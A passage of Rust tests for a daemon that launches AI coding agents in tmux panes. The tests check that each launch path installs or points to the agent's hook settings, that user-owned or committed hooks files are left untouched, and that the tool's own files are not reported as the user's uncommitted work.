        assert!(tracked_by(answer), "and that error reads as tracked");
        let _ = std::fs::remove_dir_all(&repo);
    }

    /// Installing twice — a worktree adopted, removed and adopted again, or a
    /// daemon restarted — must not accumulate copies. The property is
    /// `hook_install`'s, but it only holds through this caller if the caller
    /// feeds the existing file back in rather than starting from empty.
    #[tokio::test]
    async fn installing_twice_leaves_one_copy() {
        let worktree = scratch("twice");
        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;
        let once = std::fs::read_to_string(worktree.join(".codex/hooks.json")).unwrap();
        install_project_hooks(&worktree, Path::new("/tmp/h.sock")).await;
        let twice = std::fs::read_to_string(worktree.join(".codex/hooks.json")).unwrap();
        assert_eq!(once, twice, "installing is idempotent through the caller too");

        let _ = std::fs::remove_dir_all(&worktree);
    }

    #[test]
    fn the_settings_file_names_the_socket_the_ingress_listens_on() {
        let runtime = scratch("runtime");
        let path = write_claude_hook_settings(&runtime).expect("settings are written");
        assert!(path.starts_with(&runtime), "in this daemon's own directory: {}", path.display());

        let text = std::fs::read_to_string(&path).unwrap();
        let v: serde_json::Value = serde_json::from_str(&text).expect("settings json");
        // The one path that must agree with `hook_ingress`, asked of the
        // ingress itself rather than spelled out again here: two computations
        // of one socket path are two things that can disagree, and the
        // disagreement is silent at both ends.
        let socket = hook_ingress::HookIngress::socket_path(&runtime);
        let command = v["hooks"]["SessionStart"][0]["hooks"][0]["command"]
            .as_str()
            .expect("a SessionStart command");
        assert!(command.contains(&socket.display().to_string()), "{command}");
        assert!(command.contains("--agent claude"), "{command}");

        let _ = std::fs::remove_dir_all(&runtime);
    }

    /// A runtime directory that does not exist is a runner with a larger
    /// problem than a quiet pane, and the pane must still open.
    /// The call site, end to end on a real tmux server: what the pane was
    /// actually launched with.
    ///
    /// The pure builders above prove `--settings` can be produced; this is the
    /// only thing that proves anything produces it. Task 9 shipped four hook
    /// installers whose sole callers were their own tests, and this is that
    /// failure asked about directly — `pane_start_command` reads
    /// `#{pane_start_command}`, the string tmux was handed, so a wiring that
    /// quietly stopped passing the file would show up here as a launch with
    /// no flag on it.
    #[tokio::test]
    async fn a_claude_pane_this_runner_launched_names_its_settings_file() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;

        // A pane that is not claude first, in the same runtime directory: the
        // file is claude's alone, and writing it for every terminal would put
        // a settings document on disk for a runner that never launches one.
        svc.create_terminal(ws.id, "plain", "shell").await.expect("a shell pane");
        let settings = claude_hook_settings_path(&svc.root);
        assert!(!settings.exists(), "a shell pane writes no settings file: {}", settings.display());

        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");
        assert!(settings.exists(), "and a claude pane does: {}", settings.display());

        let command = super::restart_wiring_tests::pane_start_command(&svc, term.id).await;
        assert!(
            command.contains("--settings"),
            "the pane was launched telling claude where the hooks are: {command}"
        );
        assert!(
            command.contains(&settings.display().to_string()),
            "and it names the file this daemon just wrote: {command}"
        );
    }

    /// The call site, end to end: parse `--plugin-dir` out of the command
    /// tmux was actually handed, and read the skill back from where it
    /// points. Fails if `prepare_launch_hooks` stops writing the plugin, even
    /// with `write_plugin` itself still present and working.
    #[tokio::test]
    async fn opening_a_claude_pane_puts_the_skill_where_the_flag_points() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let term = svc.create_terminal(ws.id, "manager", "claude").await.expect("a claude pane");

        let command = super::restart_wiring_tests::pane_start_command(&svc, term.id).await;
        // tmux prints a start command inside double quotes, with a backslash
        // before each backslash, double quote and dollar sign in it. Undo that
        // to get the string tmux handed `sh -c`.
        let quoted = command.strip_prefix('"').and_then(|c| c.strip_suffix('"')).unwrap_or(&command);
        let (mut unquoted, mut chars) = (String::new(), quoted.chars());
        while let Some(c) = chars.next() {
            unquoted.push(if c == '\\' { chars.next().unwrap_or(c) } else { c });
        }
        let command = unquoted.as_str();
        // From the login shell on: the `env FARCOOLER_ACTOR=…` in front is
        // `with_pane_env`'s, and this probe is about claude's own argv.
        let shell = format!("{} -ilc", farcooler_core::shell::login_shell());
        let from_shell = command.find(&shell).map_or(command, |at| &command[at..]);
        let argv = super::preset_tests::claude_argv_through_both_shells(from_shell);
        let dir = argv
            .split(',')
            .skip_while(|a| *a != "--plugin-dir")
            .nth(1)
            .unwrap_or_else(|| panic!("the pane was launched with no --plugin-dir: {command} -> {argv}"));

        let skill = std::fs::read_to_string(Path::new(dir).join("skills/manager/SKILL.md"))
            .unwrap_or_else(|e| panic!("no skill where --plugin-dir points ({dir}): {e}"));
        assert!(skill.contains("**Never execute a task yourself.**"), "{skill}");
        let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
        assert!(skill.contains(&format!("{cli} task list")), "the skill names this runner's CLI: {skill}");
        let manifest = std::fs::read_to_string(Path::new(dir).join(".claude-plugin/plugin.json"))
            .expect("a plugin manifest");
        assert!(manifest.contains("\"farcooler\""), "{manifest}");

        // Nothing of the skill went into the repository: claude's copy is ours.
        assert!(!Path::new(&ws.worktree_path).join(".agents").exists());
    }

    /// `adopt_branch` is the other door into "a worktree Far Cooler just
    /// made" — work picked up from a branch pushed somewhere else. It runs
    /// the same agents in the same panes, so a pane that reports nothing is
    /// exactly as broken here as it is in `create_workspace`.
    #[tokio::test]
    async fn an_adopted_branch_gets_them_too() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        git::git(&dir.path().join("repo"), &["branch", "feat/rate-limiting"]).await.unwrap();

        let ws = svc.adopt_branch(repo, "feat/rate-limiting").await.expect("a workspace");

        let worktree = Path::new(&ws.worktree_path);
        assert!(worktree.join(".codex/hooks.json").exists(), "codex reports itself here too");
        assert!(worktree.join(".cursor/hooks.json").exists(), "and so does cursor");
    }

    /// The regression the workspace suite caught, asked directly.
    ///
    /// `against_a_real_daemon` went red on `ConfirmationRequired` where it
    /// expected `Removed`: `install_project_hooks` writes two files into a
    /// fresh worktree, `git::is_dirty` counts untracked files, and
    /// `removal_needs_confirmation` reads that — so a workspace created a
    /// second ago and touched by nobody demanded that the user type its name
    /// back to remove it, on the strength of two files they have never seen.
    /// Far Cooler must not report its own writes to the user as their work.
    #[tokio::test]
    async fn a_workspace_nobody_has_touched_needs_no_confirmation_to_remove() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD")
            .await
            .expect("a workspace");

        // The files really are there -- this is a filter, not an absence.
        let worktree = Path::new(&ws.worktree_path);
        assert!(worktree.join(".codex/hooks.json").exists(), "the installer ran");

        assert!(
            !svc.removal_needs_confirmation(ws.id).await.expect("dirt check"),
            "a worktree holding nothing but files Far Cooler wrote is clean"
        );

        // And the guard still guards: a file the USER wrote brings it back.
        std::fs::write(worktree.join("theirs.txt"), "real work").unwrap();
        assert!(
            svc.removal_needs_confirmation(ws.id).await.expect("dirt check"),
            "one file of the user's own is still uncommitted work"
        );
    }

    /// The other signal the same fact reaches: the diff view a worktree opens
    /// with. `change_set::working_tree` is what draws it, and it must not show
    /// the user two files nobody put there.
    #[tokio::test]
    async fn a_fresh_worktree_opens_with_an_empty_diff() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD")
            .await
            .expect("a workspace");
        let worktree = Path::new(&ws.worktree_path);

        let wt = crate::change_set::working_tree(worktree).await.expect("status");
        assert!(
            !wt.is_dirty(),
            "nothing Far Cooler wrote appears as the user's work: {:?}",
            wt.untracked
        );

        std::fs::write(worktree.join("theirs.txt"), "real work").unwrap();
        let wt = crate::change_set::working_tree(worktree).await.expect("status");
        assert_eq!(
            wt.untracked.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(),
            vec!["theirs.txt"],
            "and the user's own file is the only thing in it"
        );
    }

    /// A file of the user's OWN inside `.codex/` must not be swallowed by the
    /// subtraction. `--untracked-files=all` is what makes this true: their
    /// file is its own record, and only our exact paths are dropped. The
    /// alternative this rules out is a subtraction written as `.codex/` or a
    /// glob, which would hide their file along with ours.
    #[tokio::test]
    async fn a_users_own_file_beside_ours_is_still_their_work() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD")
            .await
            .expect("a workspace");
        let worktree = Path::new(&ws.worktree_path);

        std::fs::write(worktree.join(".codex").join("config.toml"), "theirs").unwrap();

        assert!(
            svc.removal_needs_confirmation(ws.id).await.expect("dirt check"),
            "a file of their own next to ours is still uncommitted work"
        );
    }

    /// A resumed claude pane reports itself too.
    ///
    /// This is the branch a pane takes coming back from a chat or after a
    /// restart, and by the end of a day on a long-lived runner it is how most
    /// claude panes are running. Wired only at `create_terminal`, the live
    /// view worked once and went silent the first time anything respawned the
    /// pane — which is the exact shape of the bug this whole plan exists to
    /// remove, arriving through the other door.
    #[test]
    fn a_resumed_claude_pane_is_still_launched_with_the_settings_file() {
        let command = terminal_mode_command(
            "claude",
            "018f5b2c-0000-7000-8000-00000000000b",
            true,
            &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")),
        );
        assert!(command.contains("--resume"), "it is still a resume: {command}");
        assert!(command.contains("--settings"), "and it still reports itself: {command}");
        assert!(command.contains("'/tmp/fc/hooks.json'"), "quoted, as everywhere else: {command}");
    }

    #[test]
    fn a_claude_pane_that_starts_clean_is_launched_with_it_as_well() {
        // The other half of the claude branch: a session with nothing on disk
        // behind it starts fresh, and a fresh start is a launch like any other.
        let command =
            terminal_mode_command("claude:opus", "", false, &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")));
        assert!(!command.contains("--resume"), "nothing to resume: {command}");
        assert!(command.contains("--model opus"), "the model survives: {command}");
        assert!(command.contains("--settings"), "and so does the live view: {command}");
    }

    /// codex has its own file in the worktree and no flag to be told about
    /// one. A `--settings` in front of `codex resume` would be an argument it
    /// does not understand, which kills the pane rather than merely quieting
    /// it — a strictly worse failure than the one this is fixing.
    #[test]
    fn a_resumed_codex_pane_is_not_handed_claudes_flag() {
        for resumable in [true, false] {
            let command = terminal_mode_command(
                "codex",
                "018f5b2c-0000-7000-8000-00000000000c",
                resumable,
                &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")),
            );
            assert!(!command.contains("--settings"), "resumable={resumable}: {command}");
        }
    }

    /// The resumed command still has to survive both shells, for
    /// `the_settings_path_survives_both_shells_as_one_argument`'s reason —
    /// this branch writes its own `format!` and could have been quoted the
    /// naive way independently of the launch arm.
    #[cfg(unix)]
    #[test]
    fn the_resumed_settings_path_survives_both_shells_too() {
        // Real names: runs the builder's command through a shell with the agent swapped for printf; nothing reaches tmux.
        let _real = crate::service::test_agent::real_names();
        let path = "/tmp/My Runner/hooks.json";
        let sid = "018f5b2c-0000-7000-8000-00000000000d";
        let command = terminal_mode_command("claude", sid, true, &LaunchExtras::settings_only(Path::new(path)));
        let prefix = format!("{} -ilc", farcooler_core::shell::login_shell());
        let probe = command.replace(&prefix, "/bin/sh -c").replace("claude", "printf ,%s");
        assert!(probe.starts_with("/bin/sh -c"), "the prefix was found and replaced: {probe}");

        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&probe)
            .output()
            .expect("run the probe");
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert_eq!(
            stdout,
            format!(",--resume,{sid},--settings,{path}"),
            "four arguments, and the path is one of them: {probe} -> {stdout}"
        );
    }

    /// Resumed as well as fresh: a respawned pane is most claude panes by the
    /// end of a day, and a manager that loses its skill on a restart has lost
    /// its rules mid-job.
    #[cfg(unix)]
    #[test]
    fn a_resumed_claude_keeps_the_plugin_dir() {
        let (s, p) = ("/tmp/My Runner/hooks.json", "/tmp/My Runner/claude-plugin");
        let sid = "018f5b2c-0000-7000-8000-00000000000f";
        let extras = LaunchExtras { settings: Some(s.into()), plugin_dir: Some(p.into()), ..LaunchExtras::NONE };
        let command = terminal_mode_command("claude", sid, true, &extras);
        assert_eq!(
            super::preset_tests::claude_argv_through_both_shells(&command),
            format!(",--resume,{sid},--settings,{s},--plugin-dir,{p}")
        );
    }

    /// `split_terminal`, on a real pane. Splitting is how most panes on a
    /// runner are made and it built its command with `preset_command`, so
    /// most claude panes reported nothing at all.
    #[tokio::test]
    async fn a_claude_pane_made_by_splitting_names_the_settings_file() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let target = svc.create_terminal(ws.id, "one", "shell").await.expect("a pane to split");

        let split = svc
            .split_terminal(ws.id, target.id, farcooler_protocol::v1::SplitSide::Right, "two", "claude")
            .await
            .expect("split");

        let command = super::restart_wiring_tests::pane_start_command(&svc, split.id).await;
        let settings = claude_hook_settings_path(&svc.root);
        assert!(settings.exists(), "the split wrote the settings file: {}", settings.display());
        assert!(
            command.contains(&settings.display().to_string()),
            "and the pane it made names it: {command}"
        );
    }

    /// `restart_terminal`, on a real pane. A pane that restarts must not go
    /// quiet; this is the path a lost or killed agent comes back through.
    #[tokio::test]
    async fn a_restarted_claude_pane_names_the_settings_file() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");

        svc.restart_terminal(term.id).await.expect("restart");

        let command = super::restart_wiring_tests::pane_start_command(&svc, term.id).await;
        let settings = claude_hook_settings_path(&svc.root);
        assert!(
            command.contains(&settings.display().to_string()),
            "a restarted pane still reports itself: {command}"
        );
    }

    /// `set_pane_mode` going back to a terminal — the pane the user just
    /// switched out of chat. Same builder as the restart, different door, and
    /// the door is what this pins.
    #[tokio::test]
    async fn a_pane_switched_back_to_a_terminal_names_the_settings_file() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");

        let back = svc.set_pane_mode(term.id, models::PaneMode::Terminal, false).await.expect("terminal");
        assert_eq!(back.pane_mode, models::PaneMode::Terminal);

        let command = super::restart_wiring_tests::pane_start_command(&svc, term.id).await;
        let settings = claude_hook_settings_path(&svc.root);
        assert!(
            command.contains(&settings.display().to_string()),
            "a pane coming back from a chat still reports itself: {command}"
        );

        let _ = svc.stop_terminal(term.id).await;
    }

    /// The other call site, and the one Task 9 described and never wired: a
    /// worktree Far Cooler makes gets the files codex and cursor read.
    #[tokio::test]
    async fn a_new_workspace_gets_the_project_local_hook_files() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD")
            .await
            .expect("a workspace");

        let worktree = Path::new(&ws.worktree_path);
        for relative in [".codex/hooks.json", ".cursor/hooks.json"] {
            let text = std::fs::read_to_string(worktree.join(relative))
                .unwrap_or_else(|e| panic!("{relative} is written into the worktree: {e}"));
            assert!(
                text.contains(&hook_ingress::HookIngress::socket_path(&svc.root).display().to_string()),
                "{relative} names this daemon's hook socket: {text}"
            );
        }
    }

    #[test]
    fn a_settings_file_that_cannot_be_written_is_not_a_terminal_that_fails() {
        let missing = std::env::temp_dir().join(format!("farcooler-absent-{}", Uuid::now_v7()));
        assert!(write_claude_hook_settings(&missing).is_none(), "no path, no panic");
    }
}

/// Opening a codex or cursor pane is what installs that agent's hooks, in the
/// worktree the pane opens in.
///
/// The repository a person actually works in is adopted by the reconciler, not
/// created by Far Cooler, so the two installers that hung off `create_workspace`
/// and `adopt_branch` never reached it: the checkout that mattered most was the
/// one that stayed silent while throwaway worktrees worked. Every workspace here
/// therefore comes from `a_workspace`, which is `reconcile::repository` adopting
/// a real main checkout — the exact shape of the case this fixes.
#[cfg(test)]
mod launch_hook_install_tests {
    use super::*;

    use super::restart_wiring_tests::a_workspace;

    fn codex_hooks(ws: &models::Workspace) -> PathBuf {
        Path::new(&ws.worktree_path).join(crate::hook_install::CODEX_HOOKS)
    }

    fn cursor_hooks(ws: &models::Workspace) -> PathBuf {
        Path::new(&ws.worktree_path).join(crate::hook_install::CURSOR_HOOKS)
    }

    /// A model on the preset must not hide the agent behind it. Half the
    /// presets a runner launches carry one.
    #[test]
    fn the_agent_is_read_off_the_preset_whether_or_not_it_names_a_model() {
        for preset in ["codex", "codex:gpt-5.6-sol"] {
            let (file, _) = project_hook_file_for(preset).unwrap_or_else(|| panic!("{preset}"));
            assert_eq!(file, crate::hook_install::CODEX_HOOKS, "{preset}");
        }
        for preset in ["cursor", "cursor:auto"] {
            let (file, _) = project_hook_file_for(preset).unwrap_or_else(|| panic!("{preset}"));
            assert_eq!(file, crate::hook_install::CURSOR_HOOKS, "{preset}");
        }
        // claude is handed `--settings`; the rest read no hooks file at all,
        // and writing one for them would leave a registration on disk for a
        // program that never looks.
        for preset in ["claude", "claude:opus", "shell", "aider", "opencode", CHANGES_PRESET] {
            assert!(project_hook_file_for(preset).is_none(), "{preset}");
        }
    }

    /// The owner's own checkout, end to end: silent before the pane is opened,
    /// reporting after it.
    #[tokio::test]
    async fn opening_a_codex_pane_installs_codexs_hooks_in_a_checkout_far_cooler_did_not_make() {
        let (_dir, svc, ws) = a_workspace().await;
        assert!(
            !codex_hooks(&ws).exists(),
            "the reconciler adopts without writing, which is the whole problem"
        );

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");

        let text = std::fs::read_to_string(codex_hooks(&ws)).expect("codex's file, in this worktree");
        let socket = hook_ingress::HookIngress::socket_path(&svc.root);
        assert!(
            text.contains(&socket.display().to_string()),
            "and it names this daemon's hook socket: {text}"
        );
        assert!(text.contains("--agent codex"), "as codex: {text}");
    }

    /// One agent, one file. Making a worktree gets it ready for anything;
    /// opening a pane is one person opening one agent, and a `.cursor/`
    /// appearing in somebody's checkout because they opened codex is a write
    /// nothing they did asked for.
    #[tokio::test]
    async fn opening_codex_does_not_also_write_cursors_file() {
        let (_dir, svc, ws) = a_workspace().await;

        svc.create_terminal(ws.id, "agent", "codex:gpt-5.6-sol").await.expect("a codex pane");

        assert!(codex_hooks(&ws).exists(), "the agent that was opened is installed");
        assert!(
            !cursor_hooks(&ws).exists(),
            "and the one that was not is not: {}",
            cursor_hooks(&ws).display()
        );
    }

    #[tokio::test]
    async fn opening_a_cursor_pane_installs_cursors_hooks_and_only_those() {
        let (_dir, svc, ws) = a_workspace().await;

        svc.create_terminal(ws.id, "agent", "cursor").await.expect("a cursor pane");

        let text = std::fs::read_to_string(cursor_hooks(&ws)).expect("cursor's file");
        assert!(text.contains("--agent cursor"), "{text}");
        // Cursor's flat shape and its own event names, read back the way
        // cursor reads them -- "a file exists" would pass on codex's shape.
        let v: serde_json::Value = serde_json::from_str(&text).expect("cursor json");
        assert!(v["hooks"]["sessionStart"][0]["command"].is_string(), "{text}");
        assert!(!codex_hooks(&ws).exists(), "codex was not opened");
    }

    /// claude has no project file and must not grow one. `--settings` is the
    /// whole of claude's registration, and it touches nothing of the user's.
    #[tokio::test]
    async fn a_claude_or_shell_pane_writes_nothing_into_the_users_repository() {
        let (_dir, svc, ws) = a_workspace().await;

        svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");
        svc.create_terminal(ws.id, "plain", "shell").await.expect("a shell pane");

        assert!(!codex_hooks(&ws).exists(), "claude is handed a file of ours instead");
        assert!(!cursor_hooks(&ws).exists(), "and a shell reads no hooks at all");
        assert!(claude_hook_settings_path(&svc.root).exists(), "claude's own half still runs");
    }

    /// Splitting is how most panes on a runner are made.
    #[tokio::test]
    async fn a_codex_pane_made_by_splitting_installs_them_too() {
        let (_dir, svc, ws) = a_workspace().await;
        let target = svc.create_terminal(ws.id, "one", "shell").await.expect("a pane to split");
        assert!(!codex_hooks(&ws).exists(), "the shell wrote nothing");

        svc.split_terminal(ws.id, target.id, farcooler_protocol::v1::SplitSide::Right, "two", "codex")
            .await
            .expect("split");

        assert!(codex_hooks(&ws).exists(), "the split installed them");
    }

    /// A restart is a launch: the agent process starts again and reads the
    /// file again. A worktree cleaned out between the two must come back
    /// reporting rather than come back quiet.
    #[tokio::test]
    async fn a_restarted_codex_pane_installs_them_again() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        std::fs::remove_file(codex_hooks(&ws)).expect("take the file away");

        svc.restart_terminal(term.id).await.expect("restart");

        assert!(codex_hooks(&ws).exists(), "a restarted pane is not a quiet one");
    }

    /// The fourth door: a pane coming back out of a chat is a TUI being
    /// launched, and it reads the file on startup like any other.
    #[tokio::test]
    async fn a_codex_pane_coming_back_to_a_terminal_installs_them_again() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        std::fs::remove_file(codex_hooks(&ws)).expect("take the file away");

        let back = svc
            .set_pane_mode(term.id, models::PaneMode::Terminal, false)
            .await
            .expect("back to a terminal");
        assert_eq!(back.pane_mode, models::PaneMode::Terminal);

        assert!(codex_hooks(&ws).exists(), "and it reports itself again");

        let _ = svc.stop_terminal(term.id).await;
    }

    /// Somebody else's registrations survive ours arriving, through the launch
    /// path and not only through `hook_install`'s own merge. This runner really
    /// does have `herdr-agent-state.sh` registered against codex, in a
    /// repository nobody asked Far Cooler to write into.
    #[tokio::test]
    async fn a_hooks_file_the_user_already_had_keeps_everything_it_had() {
        let (_dir, svc, ws) = a_workspace().await;
        let path = codex_hooks(&ws);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            &path,
            r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"bash /Users/x/herdr-agent-state.sh session"}]}]}}"#,
        )
        .unwrap();

        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");

        let after = std::fs::read_to_string(&path).unwrap();
        assert!(after.contains("herdr-agent-state.sh"), "their hook survives: {after}");
        assert!(after.contains("--agent codex"), "and ours is there too: {after}");
    }

    /// A file we cannot parse is somebody midway through an edit. Launching a
    /// pane must not be what replaces it.
    #[tokio::test]
    async fn a_hooks_file_we_cannot_parse_survives_a_launch_byte_for_byte() {
        let (_dir, svc, ws) = a_workspace().await;
        let path = codex_hooks(&ws);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        let theirs = "{ \"hooks\": { \"SessionStart\": [ oops this is not json";
        std::fs::write(&path, theirs).unwrap();

        svc.create_terminal(ws.id, "agent", "codex").await.expect("the pane still opens");

        assert_eq!(std::fs::read_to_string(&path).unwrap(), theirs, "not one byte");
    }

    /// A worktree we cannot write into costs the live view for that agent and
    /// nothing else. The pane opens; it is quiet.
    #[tokio::test]
    async fn a_worktree_we_cannot_write_into_still_opens_the_pane() {
        let (_dir, svc, ws) = a_workspace().await;
        // `.codex` as a FILE is the real shape of this: `create_dir_all`
        // refuses, and the alternative -- propagating it -- would mean a stray
        // file of somebody's stops them opening a terminal.
        std::fs::write(Path::new(&ws.worktree_path).join(".codex"), "a file, not a directory")
            .unwrap();

        let term = svc.create_terminal(ws.id, "agent", "codex").await.expect("the pane opens");

        assert_eq!(
            std::fs::read_to_string(Path::new(&ws.worktree_path).join(".codex")).unwrap(),
            "a file, not a directory",
            "their file is untouched"
        );
        assert_eq!(term.command_preset, "codex");
    }

    /// A team's own hooks files, in each agent's shape, with nothing of ours.
    const TEAM_CODEX: &str = r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"./scripts/team-hook.sh"}]}]}}"#;
    const TEAM_CURSOR: &str = r#"{"version":1,"hooks":{"stop":[{"command":"./scripts/team-hook.sh"}]}}"#;

    /// Commit `TEAM_CODEX` and `TEAM_CURSOR` at the two hooks paths in `dir`.
    async fn commit_team_hooks(dir: &Path) {
        use crate::hook_install::{CODEX_HOOKS, CURSOR_HOOKS};
        for (relative, text) in [(CODEX_HOOKS, TEAM_CODEX), (CURSOR_HOOKS, TEAM_CURSOR)] {
            let path = dir.join(relative);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(&path, text).unwrap();
        }
        let who = ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false"];
        let add = [&who[..], &["add", "--", CODEX_HOOKS, CURSOR_HOOKS]].concat();
        let commit = [&who[..], &["commit", "-qm", "the team's hooks"]].concat();
        for args in [add, commit] {
            let out = git::git(dir, &args).await.expect("git runs");
            assert!(out.ok, "git {args:?}: {}", out.stderr);
        }
    }

    /// A hooks file the repository COMMITS is the team's, not a place for
    /// ours. Writing our registrations into it would put this runner's CLI
    /// path into the next commit of anyone who runs `git commit -a`. So no
    /// codex or cursor launch, by any of the doors a launch comes through,
    /// changes a byte of a tracked copy, and that agent is quiet in this
    /// repository.
    #[tokio::test]
    async fn a_tracked_hooks_file_is_left_exactly_as_the_repository_has_it() {
        let (_dir, svc, ws) = a_workspace().await;
        commit_team_hooks(Path::new(&ws.worktree_path)).await;

        let codex = svc.create_terminal(ws.id, "one", "codex:gpt-5.6-sol").await.expect("a codex pane");
        let cursor = svc.create_terminal(ws.id, "two", "cursor").await.expect("a cursor pane");
        svc.restart_terminal(codex.id).await.expect("restart");
        svc.split_terminal(ws.id, cursor.id, farcooler_protocol::v1::SplitSide::Right, "three", "cursor")
            .await
            .expect("split");
        svc.split_terminal(ws.id, cursor.id, farcooler_protocol::v1::SplitSide::Right, "four", "codex")
            .await
            .expect("split");

        assert_eq!(std::fs::read_to_string(codex_hooks(&ws)).unwrap(), TEAM_CODEX, "codex's tracked file");
        assert_eq!(std::fs::read_to_string(cursor_hooks(&ws)).unwrap(), TEAM_CURSOR, "cursor's tracked file");
    }

    /// The other installer: a worktree Far Cooler makes from a branch that
    /// commits both hooks files gets neither rewritten.
    #[tokio::test]
    async fn a_new_workspace_on_a_branch_that_tracks_them_leaves_them_alone() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        commit_team_hooks(&dir.path().join("repo")).await;

        let ws = svc
            .create_workspace(repo, "rate limiting", "feat/rate-limiting", "HEAD")
            .await
            .expect("a workspace");

        assert_eq!(std::fs::read_to_string(codex_hooks(&ws)).unwrap(), TEAM_CODEX, "codex's tracked file");
        assert_eq!(std::fs::read_to_string(cursor_hooks(&ws)).unwrap(), TEAM_CURSOR, "cursor's tracked file");
        assert!(!svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "and nothing is dirty");
    }

    /// The data-loss fix, read where it matters: an edit to a tracked hooks
    /// file makes removal ask before `git worktree remove --force`.
    #[tokio::test]
    async fn removal_asks_before_losing_an_edit_to_a_tracked_hooks_file() {
        let (_dir, svc, ws) = a_workspace().await;
        commit_team_hooks(Path::new(&ws.worktree_path)).await;
        assert!(!svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "committed and unchanged");

        std::fs::write(cursor_hooks(&ws), r#"{"version":1,"hooks":{}}"#).unwrap();

        assert!(svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "the edit is the user's work");
    }

    /// Our own untracked file is ours to lose; an entry somebody added to it
    /// is not. The diff view still hides the file, so removal has to look
    /// inside it.
    #[tokio::test]
    async fn removal_asks_when_our_untracked_hooks_file_holds_an_entry_of_somebodys() {
        let (_dir, svc, ws) = a_workspace().await;
        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        assert!(
            !svc.removal_needs_confirmation(ws.id).await.expect("dirt check"),
            "a hooks file holding only our entries is not the user's work"
        );

        let mut doc: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(codex_hooks(&ws)).unwrap()).unwrap();
        doc["hooks"]["Stop"] = serde_json::json!([{ "hooks": [{ "type": "command", "command": "say done" }] }]);
        std::fs::write(codex_hooks(&ws), doc.to_string()).unwrap();

        assert!(svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "their entry would be lost");
    }

    /// m1 through the launch door: the owner put a command of theirs inside
    /// our `Stop` entry, and opening codex again must neither delete it nor
    /// touch the file. Removal asks, because the file is theirs now too.
    #[tokio::test]
    async fn a_command_the_owner_put_inside_our_entry_survives_the_next_launch() {
        let (_dir, svc, ws) = a_workspace().await;
        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        let mut doc: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(codex_hooks(&ws)).unwrap()).unwrap();
        doc["hooks"]["Stop"][0]["hooks"]
            .as_array_mut()
            .unwrap()
            .push(serde_json::json!({ "type": "command", "command": "say done" }));
        let edited = serde_json::to_string_pretty(&doc).unwrap();
        std::fs::write(codex_hooks(&ws), &edited).unwrap();

        svc.create_terminal(ws.id, "agent", "codex").await.expect("another codex pane");

        assert_eq!(std::fs::read_to_string(codex_hooks(&ws)).unwrap(), edited, "left exactly as the owner has it");
        assert!(svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "their command would be lost");
    }

    /// m3: our entries from a CLI that has since moved still name this
    /// runner's socket, so they are ours. Removal doesn't ask about them, and
    /// the next launch replaces them with entries at the CLI's current path.
    #[tokio::test]
    async fn our_entries_from_a_cli_that_moved_are_still_ours() {
        let (_dir, svc, ws) = a_workspace().await;
        svc.create_terminal(ws.id, "agent", "codex").await.expect("a codex pane");
        let now = std::fs::read_to_string(codex_hooks(&ws)).unwrap();
        let current = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
        let moved = now.replace(&current, "'/Users/x/Downloads/Far Cooler.app/Contents/MacOS/farcooler'");
        assert_ne!(moved, now, "the fixture names the old path");
        std::fs::write(codex_hooks(&ws), &moved).unwrap();

        assert!(!svc.removal_needs_confirmation(ws.id).await.expect("dirt check"), "nothing here is the user's");

        svc.create_terminal(ws.id, "agent", "codex").await.expect("another codex pane");
        assert_eq!(std::fs::read_to_string(codex_hooks(&ws)).unwrap(), now, "replaced by entries at today's path");
    }

    /// The review's scenario: the owner's own untracked hooks file in a
    /// checkout the reconciler adopted, with our entries merged in when they
    /// opened codex there. Removing the worktree would delete their file.
    #[tokio::test]
